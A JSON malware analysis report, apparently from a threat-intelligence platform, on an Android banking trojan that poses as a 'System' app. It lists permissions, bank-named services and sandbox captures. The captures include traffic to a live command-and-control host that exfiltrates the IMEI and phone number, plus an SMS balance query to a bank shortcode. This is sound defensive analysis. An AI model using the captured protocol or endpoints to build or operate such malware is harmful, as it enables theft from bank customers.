@@ -1,0 +1,582 @@
+{
+    "apk_info": {
+        "id": "9EPbGXgq4Vy1kW4r",
+        "url": "https://developer.koodous.com/apks/f2aa045c12a6673e1f5f323aaeeccff8447a0f2ea16667c63ef7501dd919b8d1/",
+        "sha256": "f2aa045c12a6673e1f5f323aaeeccff8447a0f2ea16667c63ef7501dd919b8d1",
+        "md5": "c5a727e6c6a5e57eddb16e6556d5d666",
+        "sha1": "1131b0706d31c219c37fc828d92d3bd33df0c452",
+        "app": "System",
+        "package_name": "ru.drink.lime",
+        "company": "1",
+        "version": "1.0",
+        "image": null,
+        "size": 655980,
+        "tags": [
+            "banker",
+            "Lime",
+            "trojan",
+            "faketoken",
+            "fakebank",
+            "reflection",
+            "bankbot"
+        ],
+        "is_trusted": false,
+        "is_installed": false,
+        "rating": -7,
+        "is_detected": true,
+        "is_corrupted": false,
+        "last_scan": null,
+        "is_static_analyzed": true,
+        "is_dynamic_analyzed": true,
+        "is_false_positive": false,
+        "last_yara_analysis_at": null,
+        "matches_count": 6,
+        "comments_count": 2,
+        "votes_count": 7,
+        "created_at": "2016-05-17T02:09:08+02:00",
+        "updated_at": "2025-05-28T11:20:14.317198+02:00"
+    },
+    "static_analysis": {
+        "cuckoo": {
+            "target": {
+                "file": {
+                    "md5": "c5a727e6c6a5e57eddb16e6556d5d666",
+                    "sha1": "1131b0706d31c219c37fc828d92d3bd33df0c452",
+                    "size": 655980,
+                    "crc32": "D27DAB07",
+                    "sha256": "f2aa045c12a6673e1f5f323aaeeccff8447a0f2ea16667c63ef7501dd919b8d1",
+                    "sha512": "f3f7afb91ec5cbf4f7d5da67f78968a2c39910bb0114235dd9c8b64be29380763e0bc69ff61213afb21ee135d54d1a713082daa348d39c097b83d6335cf01917",
+                    "ssdeep": "12288:ls4tywUexp4VnT1OOpUXnvBDhgJn9tsf9ZZAvfjrgD12Tiz8DC4:ls4vIVnRNcKn9tC0jS12TPC4"
+                },
+                "category": "file"
+            },
+            "network": {
+                "dns": [
+                    {
+                        "type": "A",
+                        "answers": [],
+                        "request": "kikmandu.com"
+                    },
+                    {
+                        "type": "A",
+                        "answers": [
+                            {
+                                "data": "185.93.185.242",
+                                "type": "A"
+                            }
+                        ],
+                        "request": "kikmandu.com"
+                    }
+                ],
+                "irc": [],
+                "http": [
+                    {
+                        "uri": "http://kikmandu.com:3000/socket.io/?EIO=3&transport=polling",
+                        "body": "",
+                        "data": "GET /socket.io/?EIO=3&transport=polling HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: kikmandu.com:3000\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                        "host": "kikmandu.com:3000",
+                        "path": "/socket.io/?EIO=3&transport=polling",
+                        "port": 3000,
+                        "method": "GET",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    },
+                    {
+                        "uri": "http://kikmandu.com:3000/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling",
+                        "body": "",
+                        "data": "GET /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: kikmandu.com:3000\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                        "host": "kikmandu.com:3000",
+                        "path": "/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling",
+                        "port": 3000,
+                        "method": "GET",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    },
+                    {
+                        "uri": "http://kikmandu.com:3000/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=websocket",
+                        "body": "",
+                        "data": "GET /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=websocket HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: amnH3zkVhuwE1Rld1IgtnA==\r\nSec-WebSocket-Version: 13\r\nHost: kikmandu.com:3000\r\nAccept-Encoding: gzip\r\nUser-Agent: okhttp/3.0.1\r\n\r\n",
+                        "host": "kikmandu.com:3000",
+                        "path": "/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=websocket",
+                        "port": 3000,
+                        "method": "GET",
+                        "version": "1.1",
+                        "user-agent": "okhttp/3.0.1"
+                    },
+                    {
+                        "uri": "http://kikmandu.com:3000/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling",
+                        "body": "",
+                        "data": "GET /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: kikmandu.com:3000\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                        "host": "kikmandu.com:3000",
+                        "path": "/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling",
+                        "port": 3000,
+                        "method": "GET",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    },
+                    {
+                        "uri": "http://kikmandu.com:3000/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling",
+                        "body": "\\x00\\x02\\x01\\x04\\xff42[\"registration\",{\"operator_name\":\"Android\",\"partner_id\":3,\"phone\":\"15555215554\",\"mcc\":310,\"imei\":\"357242043237511\",\"operator_mnc\":\"310260\",\"country_code\":\"us\",\"client_sdk_version\":\"4.1.1\",\"client_version\":\"1.2\"}]",
+                        "data": "POST /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling HTTP/1.1\r\nContent-type: application/octet-stream\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: kikmandu.com:3000\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nContent-Length: 219\r\n\r\n\\x00\\x02\\x01\\x04\\xff42[\"registration\",{\"operator_name\":\"Android\",\"partner_id\":3,\"phone\":\"15555215554\",\"mcc\":310,\"imei\":\"357242043237511\",\"operator_mnc\":\"310260\",\"country_code\":\"us\",\"client_sdk_version\":\"4.1.1\",\"client_version\":\"1.2\"}]",
+                        "host": "kikmandu.com:3000",
+                        "path": "/socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling",
+                        "port": 3000,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    }
+                ],
+                "smtp": [],
+                "hosts": [
+                    "185.93.185.242"
+                ],
+                "domains": [
+                    {
+                        "ip": "185.93.185.242",
+                        "domain": "kikmandu.com"
+                    }
+                ]
+            }
+        },
+        "androguard": {
+            "urls": [],
+            "dexes": {
+                "classes": {
+                    "sha256": "db779f9d13c2bc6c474defd675d635740aa09f5d33ef9ff18032a430e96307e6",
+                    "ssdeep": "6144:yNgAw2drtaLy2ELy1iE5gRA5wuyjDSHn0F99tYzWT6EROUwCzuo0zEOmyMn3nRd:LARrlfLwuNHDSH0FJYzhyzuo0knr"
+                }
+            },
+            "api_key": {},
+            "cordova": "",
+            "filters": [
+                "android.intent.action.MAIN",
+                "android.provider.Telephony.SMS_RECEIVED",
+                "ru.drink.lime.ON_ALARM",
+                "android.net.conn.CONNECTIVITY_CHANGE",
+                "android.intent.action.BOOT_COMPLETED",
+                "android.provider.Telephony.SECRET_CODE",
+                "android.app.action.DEVICE_ADMIN_ENABLED",
+                "android.net.wifi.WIFI_STATE_CHANGED"
+            ],
+            "app_name": "System",
+            "services": [
+                "ru.drink.lime.ServiceScreenReceiver",
+                "ru.drink.lime.TinService",
+                "ru.drink.lime.CardService",
+                "ru.drink.lime.SocketService",
+                "ru.drink.lime.AdminService",
+                "ru.drink.lime.SbService",
+                "ru.drink.lime.AlphaService",
+                "ru.drink.lime.VtbService",
+                "ru.drink.lime.RaiffService",
+                "ru.drink.lime.ForegroundService"
+            ],
+            "libraries": [],
+            "providers": [],
+            "receivers": [
+                "ru.drink.lime.BootReceiver",
+                "ru.drink.lime.NetworkChangeReceiver",
+                "ru.drink.lime.CodeReceiver",
+                "ru.drink.lime.SmsReceiver",
+                "ru.drink.lime.MyAdmin",
+                "ru.drink.lime.AlarmReceiver"
+            ],
+            "activities": [
+                "ru.drink.lime.MainActivity",
+                "ru.drink.lime.DebugInfo",
+                "ru.drink.lime.ActivityAdmin"
+            ],
+            "certificate": {
+                "sha1": "04B1F275D947FA36F693E9BF47A9A507B476CC05",
+                "serial": "5335957A",
+                "issuerDN": "/C=1/ST=1/L=RU/O=1/OU=1/CN=Aleks",
+                "not_after": "May 7 15:19:46 2041 GMT",
+                "subjectDN": "/C=1/ST=1/L=RU/O=1/OU=1/CN=Aleks",
+                "not_before": "May 13 15:19:46 2016 GMT"
+            },
+            "permissions": [
+                "android.permission.WRITE_CONTACTS",
+                "android.permission.SEND_SMS",
+                "android.permission.RECEIVE_BOOT_COMPLETED",
+                "android.permission.INTERNET",
+                "android.permission.SYSTEM_ALERT_WINDOW",
+                "android.permission.ACCESS_WIFI_STATE",
+                "android.permission.ACCESS_NETWORK_STATE",
+                "android.permission.WAKE_LOCK",
+                "android.permission.GET_TASKS",
+                "android.permission.CALL_PHONE",
+                "android.permission.RECEIVE_SMS",
+                "android.permission.READ_PHONE_STATE",
+                "android.permission.READ_CONTACTS",
+                "android.permission.READ_SMS"
+            ],
+            "package_name": "ru.drink.lime",
+            "version_code": "1",
+            "main_activity": "ru.drink.lime.MainActivity",
+            "signature_name": "META-INF/CERT.RSA",
+            "functionalities": {
+                "SMS": [
+                    {
+                        "code": "invoke-virtual/range v0 ... v5, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String; Ljava/lang/String; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList;)V",
+                        "class": "Lru/drink/lime/prototype/Message;",
+                        "method": "sendSms"
+                    }
+                ],
+                "mcc": [
+                    {
+                        "code": "invoke-virtual v12, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;",
+                        "class": "Lru/drink/lime/SocketService;",
+                        "method": "registration"
+                    }
+                ],
+                "ssl": [
+                    {
+                        "code": "const-string v7, '^https?|wss?$'",
+                        "class": "Lio/socket/client/Url;",
+                        "method": "parse"
+                    },
+                    {
+                        "code": "const-string v4, 'https'",
+                        "class": "Lio/socket/client/Url;",
+                        "method": "parse"
+                    },
+                    {
+                        "code": "const-string v0, 'https'",
+                        "class": "Lokhttp3/Address;",
+                        "method": "<init>"
+                    }
+                ],
+                "imei": [
+                    {
+                        "code": "invoke-virtual v12, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;",
+                        "class": "Lru/drink/lime/SocketService;",
+                        "method": "registration"
+                    }
+                ],
+                "crypto": [
+                    {
+                        "code": "invoke-virtual v2, v3, Ljava/security/MessageDigest;->digest([B)[B",
+                        "class": "Lokhttp3/internal/Util;",
+                        "method": "md5Hex"
+                    },
+                    {
+                        "code": "invoke-virtual v1, v3, Ljava/security/MessageDigest;->digest([B)[B",
+                        "class": "Lokhttp3/internal/Util;",
+                        "method": "sha1"
+                    },
+                    {
+                        "code": "invoke-virtual v1, v3, Ljava/security/MessageDigest;->digest([B)[B",
+                        "class": "Lokhttp3/internal/Util;",
+                        "method": "shaBase64"
+                    }
+                ],
+                "socket": [
+                    {
+                        "code": "invoke-virtual v1, v2, Lio/socket/engineio/client/Transport;->send([Lio/socket/engineio/parser/Packet;)V",
+                        "class": "Lio/socket/engineio/client/Socket$7$1$1;",
+                        "method": "run"
+                    },
+                    {
+                        "code": "invoke-virtual v6, Lokhttp3/internal/framed/Ping;->send()V",
+                        "class": "Lokhttp3/internal/framed/FramedConnection;",
+                        "method": "writePing"
+                    },
+                    {
+                        "code": "invoke-virtual v1, v2, Lio/socket/engineio/client/Transport;->send([Lio/socket/engineio/parser/Packet;)V",
+                        "class": "Lio/socket/engineio/client/Socket$7;",
+                        "method": "call"
+                    }
+                ],
+                "phonecall": [
+                    {
+                        "code": "const-string v6, 'android.intent.action.CALL'",
+                        "class": "Lru/drink/lime/SocketService;",
+                        "method": "taskUssd"
+                    },
+                    {
+                        "code": "const-string v8, 'android.intent.action.CALL'",
+                        "class": "Lru/drink/lime/SocketService$14;",
+                        "method": "call"
+                    }
+                ],
+                "runbinary": [
+                    {
+                        "code": "invoke-static v0, Lio/socket/thread/EventThread;->exec(Ljava/lang/Runnable;)V",
+                        "class": "Lio/socket/client/Manager$1$4;",
+                        "method": "run"
+                    },
+                    {
+                        "code": "invoke-static v0, Lio/socket/thread/EventThread;->exec(Ljava/lang/Runnable;)V",
+                        "class": "Lio/socket/client/Manager$11;",
+                        "method": "run"
+                    },
+                    {
+                        "code": "invoke-static v0, Lio/socket/thread/EventThread;->exec(Ljava/lang/Runnable;)V",
+                        "class": "Lio/socket/engineio/client/Socket$15;",
+                        "method": "run"
+                    }
+                ],
+                "phonenumber": [
+                    {
+                        "code": "invoke-virtual v12, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lru/drink/lime/SocketService;",
+                        "method": "registration"
+                    }
+                ],
+                "dynamicbroadcastreceiver": [
+                    {
+                        "code": "invoke-virtual v11, v9, v1, Lru/drink/lime/Application;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;",
+                        "class": "Lru/drink/lime/Application;",
+                        "method": "onCreate"
+                    },
+                    {
+                        "code": "invoke-virtual v2, v0, v1, Lru/drink/lime/ServiceScreenReceiver;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;",
+                        "class": "Lru/drink/lime/ServiceScreenReceiver;",
+                        "method": "onCreate"
+                    },
+                    {
+                        "code": "invoke-virtual v1, v0, Lru/drink/lime/ServiceScreenReceiver;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V",
+                        "class": "Lru/drink/lime/ServiceScreenReceiver;",
+                        "method": "onDestroy"
+                    }
+                ]
+            },
+            "max_sdk_version": "",
+            "min_sdk_version": 12,
+            "new_permissions": [],
+            "displayed_version": "1.0",
+            "target_sdk_version": 23
+        }
+    },
+    "dynamic_analysis": {
+        "droidbox": {
+            "dns": [
+                {
+                    "ip": "185.93.185.242",
+                    "hostname": "kikmandu.com"
+                }
+            ],
+            "recvnet": [
+                {
+                    "pid": 846,
+                    "tid": 705456600,
+                    "data": "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 4\r\nAccess-Control-Allow-Origin: *\r\nSet-Cookie: io=z_Xqq\r\n\r\n5a4c4136315254345f63494141666a0d0a446174653a205475652c203137204d617920323031362030303a32303a313920474d540d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a0d0a0001ff36",
+                    "time": 4.42453,
+                    "srchost": "kikmandu.com",
+                    "srcport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705966464,
+                    "data": "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 100\r\nAccess-Control-Allow-Origin: *\r\nSet-Cookie: io=z_XZLA61RT4_cIAAfj\",\"upgrades\":[\"websocket\"],\"pingInterval\":25000,\"pingTimeout\":5000}\r\n\r\n71715a4c4136315254345f63494141666a0d0a446174653a205475652c203137204d617920323031362030303a32303a313720474d540d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a0d0a000906ff307b22736964223a227a5f587171",
+                    "time": 3.206776,
+                    "srchost": "kikmandu.com",
+                    "srcport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705700976,
+                    "data": "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: eGOtRbxQekio60jurb4/6zi2WPQ=\r\n\r\n",
+                    "time": 3.894882,
+                    "srchost": "kikmandu.com",
+                    "srcport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705700976,
+                    "data": "81063370726f6265",
+                    "time": 4.232122,
+                    "srchost": "kikmandu.com",
+                    "srcport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705701184,
+                    "data": "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 5\r\nAccess-Control-Allow-Origin: *\r\nSet-Cookie: io=z_Xqq\r\n\r\n5a4c4136315254345f63494141666a0d0a446174653a205475652c203137204d617920323031362030303a32303a313820474d540d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a0d0a0002ff3430",
+                    "time": 3.847225,
+                    "srchost": "kikmandu.com",
+                    "srcport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705456536,
+                    "data": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 2\r\nAccess-Control-Allow-Origin: *\r\nSet-Cookie: io=z_XqqZLA61RT4_cIAAfj\r\nDate: Tue, 17 May 2016 00:20:19 GMT\r\nConnection: keep-alive\r\n\r\nok",
+                    "time": 4.407168,
+                    "srchost": "kikmandu.com",
+                    "srcport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705700976,
+                    "data": "813f34325b226f6e5265676973746572222c7b226964223a3237332c2270617373776f7264223a226f52693933222c226861735f636f6e7461637473223a317d5d811534325b226f6e417574686f72697a6174696f6e225d817e05bf34325b226e65775f74656d706c61746573222c7b2266696c746572223a22616c6c222c226c697374223a5b7b226964223a223636222c2274656d706c617465223a22d092d0b0d18820d0b7d0b0d0bfd180d0bed18120d0bdd0b520d0b2d18bd0bfd0bed0bbd0bdd0b5d0bd2c20d182d0b0d0ba20d0bad0b0d0ba20d0ba20d0b4d0b0d0bdd0bdd0bed0bcd18320d0bdd0bed0bcd0b5d180d18320d182d0b5d0bbd0b5d184d0bed0bdd0b020d0bdd0b520d0bfd0bed0b4d0bad0bbd18ed187d0b5d0bd20d09cd0bed0b1d0b8d0bbd18cd0bdd18bd0b920d0b1d0b0d0bdd0ba2e203a783a222c2274797065223a2234222c2264617461223a223130227d2c7b226964223a223639222c2274656d706c617465223a223a783a20d091d0b0d0bbd0b0d0bdd1813a203a783a2e20d0a1d09fd0a0d090d092d09ad090202d20d0bfd0bed0b4d180d0bed0b1d0bdd0b5d0b520d0bed0b120d183d181d0bbd183d0b3d0b520d09cd0bed0b1d0b8d0bbd18cd0bdd18bd0b920d0b1d0b0d0bdd0ba2e222c2274797065223a2234222c2264617461223a2234227d2c7b226964223a223730222c227465",
+                    "time": 4.685308,
+                    "srchost": "kikmandu.com",
+                    "srcport": 3000,
+                    "processname": "ru.drink.lime"
+                }
+            ],
+            "sendnet": [
+                {
+                    "pid": 846,
+                    "tid": 705966464,
+                    "data": "GET /socket.io/?EIO=3&transport=polling HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: kikmandu.com:3000\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                    "time": 2.931804,
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705611048,
+                    "data": "818641eba927739bdb48238e",
+                    "time": 4.14003,
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705729360,
+                    "data": "81bf3e48ba1b0a7ae1394d29cc7e6126d56f572ed3785f3cd374506a96601c2cdb6f5b6a802a0a7a8c29087e83290964986f4738df39047896395c27de621c72982b1c35e781c3439756c877a50dea30f620ad1cf939bc2af13fab22e33fa72db57ab361f337bc26b56cf977a560fa75a16ffb72bb74bc3ae733ea79a666e461f539ac3ab56cea71a37bf861ea0b81813c8d4f060e819073fb1cbb47c947991c954fde1d9f58da079a3ee68181f7ea7809c5",
+                    "time": 5.205219,
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705610880,
+                    "data": "8181824885e4b781b1d52ed738e11c8c1ab45ba350ba5cbe42b45abe57bb0cfb43f747b31aef1ce00bf90ca759a65da057a74af502f7418551ec1df54588",
+                    "time": 4.50847,
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705700976,
+                    "data": "GET /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=websocket HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: amnH3zkVhuwE1Rld1IgtnA==\r\nSec-WebSocket-Version: 13\r\nHost: kikmandu.com:3000\r\nAccept-Encoding: gzip\r\nUser-Agent: okhttp/3.0.1\r\n\r\n",
+                    "time": 3.792957,
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705456536,
+                    "data": "POST /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling HTTP/1.1\r\nContent-type: application/octet-stream\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nH2[\"registration\",{\"operator_name\":\"Android\",\"partner_id\":3,\"phone\":\"15555215554\",\"mcc\":310,\"imei\":\"357242043237511\",\"operator_mnc\":\"310260\",\"country_code\":\"us\",\"client_sdk_version\":\"4.1.1\",\"client_version\":\"1.2\"}]\r\n\r\n6f73743a206b696b6d616e64752e636f6d3a333030300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a4163636570742d456e636f64696e673a20677a69700d0a436f6e74656e742d4c656e6774683a203231390d0a0d0a00020104ff34",
+                    "time": 4.252515,
+                    "dataleak": [
+                        "TAINT_PHONE_NUMBER",
+                        "TAINT_IMEI"
+                    ],
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705701184,
+                    "data": "GET /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: kikmandu.com:3000\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                    "time": 3.741589,
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705456600,
+                    "data": "GET /socket.io/?EIO=3&sid=z_XqqZLA61RT4_cIAAfj&transport=polling HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: kikmandu.com:3000\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                    "time": 4.244221,
+                    "desthost": "kikmandu.com",
+                    "destport": 3000,
+                    "processname": "ru.drink.lime"
+                }
+            ],
+            "sendsms": [
+                {
+                    "pid": 846,
+                    "tid": 705729360,
+                    "time": 5.950669,
+                    "number": "900",
+                    "message": "БАЛАНС",
+                    "processname": "ru.drink.lime"
+                }
+            ],
+            "dexclass": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "path": "/data/app/ru.drink.lime-1.apk",
+                    "time": 0.197725,
+                    "processname": "ru.drink.lime"
+                }
+            ],
+            "filesread": [
+                {
+                    "pid": 846,
+                    "tid": 705953864,
+                    "data": "ab644e0d5ad854781dc0286aa76079c8f81f67ef",
+                    "name": "/dev/urandom",
+                    "time": 3.591577,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "504b05060000000080008000712b0000e5d609000000504b010214001400080808008792ad48a2e65d2091080000cc220000130004000000000000000000000000000000416e64726f69644d616e69666573742e786d6cfeca0000504b01020a000a00000800007d92ad48dc4ec2d1ac010000ac0100002d00000000000000000000000000d60800007265732f6472617761626c652d686470692d7631312f69635f737461745f616374696f6e5f696e666f2e706e67504b01020a000a00000800007d92ad480f61a1e60f0100000f0100004200000000000000000000000000d00a00007265732f6472617761626c652d686470692d76342f6170707468656d655f746578746669656c645f6163746976617465645f686f6c6f5f6c696768742e392e706e67504b01020a000a00000800007d92ad4873f7aa082c0100002c01000040000000000000000000000000003f0c00007265732f6472617761626c652d686470692d76342f6170707468656d655f746578746669656c645f64656661756c745f686f6c6f5f6c696768742e392e706e67504b01020a000a00000800007d92ad4852279f5186010000860100004900000000000000000000000000cc0d00007265732f6472617761626c652d686470692d76342f6170707468656d655f746578746669656c645f64697361626c65645f666f63757365645f686f6c6f5f",
+                    "name": "/data/app/ru.drink.lime-1.apk",
+                    "time": 0.278261,
+                    "processname": "ru.drink.lime"
+                }
+            ],
+            "libraries": [],
+            "phonecalls": [],
+            "cryptousage": [],
+            "fileswritten": [],
+            "servicestart": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "name": "ru.drink.lime.SocketService",
+                    "time": 1.577401,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "name": "ru.drink.lime.SocketService",
+                    "time": 2.113465,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "name": "ru.drink.lime.SocketService",
+                    "time": 2.121771,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "name": "ru.drink.lime.SocketService",
+                    "time": 2.13934,
+                    "processname": "ru.drink.lime"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "name": "ru.drink.lime.SocketService",
+                    "time": 6.038976,
+                    "processname": "ru.drink.lime"
+                }
+            ]
+        }
+    }
+}
